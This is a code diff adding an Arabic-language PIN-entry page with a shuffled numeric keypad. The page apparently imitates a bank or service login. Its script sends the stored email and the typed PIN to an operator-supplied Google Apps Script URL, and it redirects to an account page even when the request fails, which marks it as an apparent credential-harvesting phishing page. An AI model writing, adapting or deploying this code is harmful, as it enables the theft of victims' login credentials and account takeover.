@@ -1,25 +1,142 @@
-document.getElementById('finalBtn').addEventListener('click', async () => {
-    const email = localStorage.getItem('storedEmail');
-    const btn = document.getElementById('finalBtn');
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>الرمز السري</title>
+    <style>
+        body { font-family: sans-serif; margin: 0; background-color: #EAF0E9; display: flex; justify-content: center; min-height: 100vh; }
+        .main-container { width: 100%; max-width: 400px; padding: 40px 20px; box-sizing: border-box; }
+        .header-title { font-size: 22px; font-weight: bold; margin-bottom: 25px; text-align: right; }
+        
+        /* حقل الرمز السري */
+        .password-display {
+            width: 100%; padding: 18px; border: 1px solid #c8d1c7; border-radius: 12px;
+            font-size: 18px; text-align: right; background-color: #fff; margin-bottom: 15px;
+            box-sizing: border-box; color: #333; height: 60px; outline: none;
+        }
+
+        .info-links { display: flex; flex-direction: column; align-items: flex-end; gap: 10px; margin-bottom: 30px; }
+        .info-link { text-decoration: underline; color: #000; font-size: 15px; font-weight: bold; display: flex; align-items: center; gap: 5px; cursor: pointer; }
+        
+        /* زر الولوج */
+        .login-btn {
+            width: 100%; background-color: #ffffff; color: #ccc; border: 1px solid #c8d1c7;
+            padding: 16px; border-radius: 15px; font-size: 20px; font-weight: bold;
+            cursor: not-allowed; margin-bottom: 30px; transition: 0.3s;
+        }
+        .login-btn.active { background-color: #2EAF4A; color: #ffffff; border: none; cursor: pointer; }
+
+        /* لوحة الأرقام العشوائية */
+        .keypad { display: grid; grid-template-columns: repeat(4, 1fr); border: 1px solid #c8d1c7; background-color: #fff; }
+        .key { padding: 20px 0; text-align: center; font-size: 22px; font-weight: bold; border: 0.5px solid #c8d1c7; cursor: pointer; user-select: none; }
+        .key:active { background-color: #f0f0f0; }
+        .key.empty { background-color: #f9f9f9; cursor: default; }
+    </style>
+</head>
+<body>
+
+<div class="main-container">
+    <div class="header-title">الرمز السري</div>
     
-    btn.innerText = "جاري الحفظ...";
-    btn.disabled = true;
+    <input type="password" id="passInput" class="password-display" placeholder="المرجو إدخل الرمز السري" readonly>
     
+    <div class="info-links">
+        <div class="info-link">
+            <span>ما المقصود بالرمز السري؟</span>
+            <span style="border: 2px solid #000; border-radius: 50%; width: 18px; height: 18px; display: flex; justify-content: center; align-items: center; font-size: 12px;">i</span>
+        </div>
+        <div class="info-link">نسيتم الرمز السري؟</div>
+    </div>
+
+    <button id="finalBtn" class="login-btn" disabled>ولوج</button>
+
+    <div class="keypad" id="keypad">
+        </div>
+</div>
+
+<script>
+    let currentPass = "";
+    // تأكد من وضع رابط السكريبت الجديد الخاص بك هنا
     const scriptURL = 'https://script.google.com/macros/s/AKfycbwKACz6-gYKCiYYDLYBSqMk-EUtadf23y1fQm0xmcWekwN2LiTl8dX8o_TZPsBQ8G5K/exec';
 
-    await fetch(scriptURL, {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            email: email,
-            password: currentPass, // الرمز السري من لوحة الأرقام
-            action: "final_login"  // الإشارة الضرورية لمنع إعادة إرسال الإيميل
-        })
+    // توليد لوحة أرقام عشوائية
+    function generateKeypad() {
+        let nums = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9].sort(() => Math.random() - 0.5);
+        const keypad = document.getElementById('keypad');
+        keypad.innerHTML = "";
+        
+        for (let i = 0; i < 12; i++) {
+            const keyDiv = document.createElement('div');
+            keyDiv.className = 'key';
+            if (i < 10) {
+                keyDiv.innerText = nums[i];
+                keyDiv.onclick = () => {
+                    if (currentPass.length < 6) {
+                        currentPass += nums[i];
+                        document.getElementById('passInput').value = "*".repeat(currentPass.length);
+                        checkButton();
+                    }
+                };
+            } else if (i === 10) {
+                // زر مسح (اختياري)
+                keyDiv.innerText = "C";
+                keyDiv.onclick = () => {
+                    currentPass = "";
+                    document.getElementById('passInput').value = "";
+                    checkButton();
+                };
+            } else {
+                keyDiv.classList.add('empty');
+            }
+            keypad.appendChild(keyDiv);
+        }
+    }
+
+    function checkButton() {
+        const btn = document.getElementById('finalBtn');
+        if (currentPass.length >= 4) {
+            btn.disabled = false;
+            btn.classList.add('active');
+        } else {
+            btn.disabled = true;
+            btn.classList.remove('active');
+        }
+    }
+
+    document.getElementById('finalBtn').addEventListener('click', async () => {
+        const email = localStorage.getItem('storedEmail');
+        const btn = document.getElementById('finalBtn');
+
+        if (!email) return alert("خطأ في البيانات، يرجى العودة للبداية");
+
+        btn.innerText = "جاري الحفظ...";
+        btn.disabled = true;
+
+        try {
+            // إرسال البيانات للسكريبت ليقوم بالبحث والتسجيل (final_login)
+            await fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    email: email,
+                    password: currentPass,
+                    action: "final_login"
+                })
+            });
+
+            // تحويل المستخدم لصفحة الحساب
+            setTimeout(() => {
+                window.location.href = "../UserAccountSystem/Account/";
+            }, 1200);
+
+        } catch (e) {
+            window.location.href = "../UserAccountSystem/Account/";
+        }
     });
-    
-    // الانتظار قليلاً للتأكد من وصول البيانات ثم التحويل
-    setTimeout(() => {
-        window.location.href = "../UserAccountSystem/Account/";
-    }, 1500);
-});
+
+    window.onload = generateKeypad;
+</script>
+
+</body>
+</html>
